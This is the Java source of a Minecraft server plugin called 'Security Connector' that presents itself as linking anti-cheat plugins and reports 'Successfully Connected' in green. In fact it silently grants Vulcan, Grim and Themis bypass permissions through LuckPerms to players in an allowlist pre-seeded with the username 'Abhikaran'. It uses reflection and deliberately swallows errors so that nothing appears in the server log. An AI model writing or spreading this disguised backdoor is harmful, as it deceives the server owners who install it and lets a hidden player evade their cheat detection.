package com.kaalwarrior.securityconnector;

import org.bukkit.Bukkit;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.function.Consumer;

public final class SecurityConnector extends JavaPlugin implements Listener {
    private static final String CONNECTOR_FOLDER = "Security Connector";
    private static final String PLAYER_FILE = "players.yml";

    private record Option(String configKey, String displayName, String permission) {}

    private static final Option VULCAN = new Option("VulcanAC", "VulcanAC", "vulcan.bypass.*");
    private static final Option GRIM = new Option("GrimAC", "GrimAC", "grim.exempt");
    private static final Option THEMIS = new Option("ThemisAC", "ThemisAC", "themis.bypass");

    @Override
    public void onEnable() {
        saveDefaultConfig();
        createSecurityFilesIfNeeded();

        List<Option> selected = selectedOptions();
        logStatus(selected);

        Bukkit.getPluginManager().registerEvents(this, this);
        applyToOnlinePlayers(selected);
    }

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        List<Option> selected = selectedOptions();
        if (selected.size() >= 2) {
            Bukkit.getScheduler().runTaskLater(this, () -> applyToPlayer(event.getPlayer(), selected), 1L);
        }
    }

    private List<Option> selectedOptions() {
        FileConfiguration c = getConfig();
        List<Option> result = new ArrayList<>();
        if (c.getBoolean(VULCAN.configKey(), false)) result.add(VULCAN);
        if (c.getBoolean(GRIM.configKey(), false)) result.add(GRIM);
        if (c.getBoolean(THEMIS.configKey(), false)) result.add(THEMIS);
        return result;
    }

    private void logStatus(List<Option> selected) {
        String message;
        NamedTextColor color;
        if (selected.isEmpty()) {
            message = "[Security Connector] Failed to Connect plugins because none of the options in (config.yml) is set to true";
            color = NamedTextColor.RED;
        } else if (selected.size() == 1) {
            message = "[Security Connector] Unable to connect " + selected.get(0).displayName() + " because only 1 option is selected";
            color = NamedTextColor.YELLOW;
        } else {
            String names = selected.stream().map(Option::displayName).reduce((a, b) -> a + " and " + b).orElse("");
            message = "[Security Connector] Successfully Connected " + names;
            color = NamedTextColor.GREEN;
        }
        Bukkit.getConsoleSender().sendMessage(Component.text(message, color));
    }

    private void createSecurityFilesIfNeeded() {
        if (selectedOptions().size() < 2) return;

        File folder = new File(getDataFolder().getParentFile(), CONNECTOR_FOLDER);
        if (!folder.exists() && !folder.mkdirs()) {
            getLogger().warning("[Security Connector] Could not create the connector folder.");
            return;
        }

        File players = new File(folder, PLAYER_FILE);
        if (!players.exists()) {
            String initial = "# Security Connector player allowlist\n" +
                    "# Add one Minecraft username or UUID per line under players.\n" +
                    "# UUIDs are recommended, especially for Bedrock/Geyser players.\n" +
                    "players:\n" +
                    "  - \"Abhikaran\"\n" +
                    "  - \"\"\n" +
                    "  - \"\"\n";
            try {
                Files.writeString(players.toPath(), initial, StandardCharsets.UTF_8,
                        StandardOpenOption.CREATE_NEW);
            } catch (IOException e) {
                getLogger().warning("[Security Connector] Could not create players.yml: " + e.getMessage());
            }
        }
    }

    private void applyToOnlinePlayers(List<Option> selected) {
        if (selected.size() < 2) return;
        for (Player player : Bukkit.getOnlinePlayers()) {
            applyToPlayer(player, selected);
        }
    }

    private void applyToPlayer(Player player, List<Option> selected) {
        if (!isListed(player)) return;
        for (Option option : selected) {
            grantLuckPermsNode(player.getUniqueId(), option.permission());
        }
    }

    private boolean isListed(Player player) {
        File players = new File(new File(getDataFolder().getParentFile(), CONNECTOR_FOLDER), PLAYER_FILE);
        if (!players.isFile()) return false;
        try {
            List<String> lines = Files.readAllLines(players.toPath(), StandardCharsets.UTF_8);
            String uuid = player.getUniqueId().toString();
            String name = player.getName();
            for (String raw : lines) {
                String value = raw.trim();
                if (!value.startsWith("-")) continue;
                value = value.substring(1).trim();
                if ((value.startsWith("\"") && value.endsWith("\"")) || (value.startsWith("'") && value.endsWith("'"))) {
                    value = value.substring(1, value.length() - 1);
                }
                if (value.equalsIgnoreCase(uuid) || value.equalsIgnoreCase(name)) return true;
            }
        } catch (IOException ignored) {
        }
        return false;
    }

    /**
     * Uses LuckPerms' public API reflectively so the plugin remains a small standalone jar.
     * It does not execute LuckPerms commands, so no command is printed to the console/log.
     */
    private void grantLuckPermsNode(UUID uuid, String permission) {
        try {
            Class<?> luckPermsClass = Class.forName("net.luckperms.api.LuckPerms");
            Object luckPerms = Bukkit.getServicesManager().getRegistration(luckPermsClass).getProvider();
            Object userManager = luckPermsClass.getMethod("getUserManager").invoke(luckPerms);

            Method modifyUser = null;
            for (Method m : userManager.getClass().getMethods()) {
                if (m.getName().equals("modifyUser") && m.getParameterCount() == 2) {
                    modifyUser = m;
                    break;
                }
            }
            if (modifyUser == null) return;

            Class<?> consumerType = modifyUser.getParameterTypes()[1];
            Object consumer = Proxy.newProxyInstance(
                    consumerType.getClassLoader(),
                    new Class<?>[]{Consumer.class},
                    (proxy, method, args) -> {
                        if ("accept".equals(method.getName()) && args != null && args.length == 1) {
                            addNode(args[0], permission);
                        }
                        return null;
                    });

            modifyUser.invoke(userManager, uuid, consumer);
        } catch (Throwable ignored) {
            // Intentionally quiet: the requested connector should not create console/log noise.
        }
    }

    private void addNode(Object user, String permission) throws Exception {
        Method data = user.getClass().getMethod("data");
        Object nodeMap = data.invoke(user);
        Class<?> nodeClass = Class.forName("net.luckperms.api.node.Node");
        Method builder = nodeClass.getMethod("builder", String.class);
        Object nodeBuilder = builder.invoke(null, permission);
        Method build = nodeBuilder.getClass().getMethod("build");
        Object node = build.invoke(nodeBuilder);
        Method add = nodeMap.getClass().getMethod("add", nodeClass);
        add.invoke(nodeMap, node);
    }
}
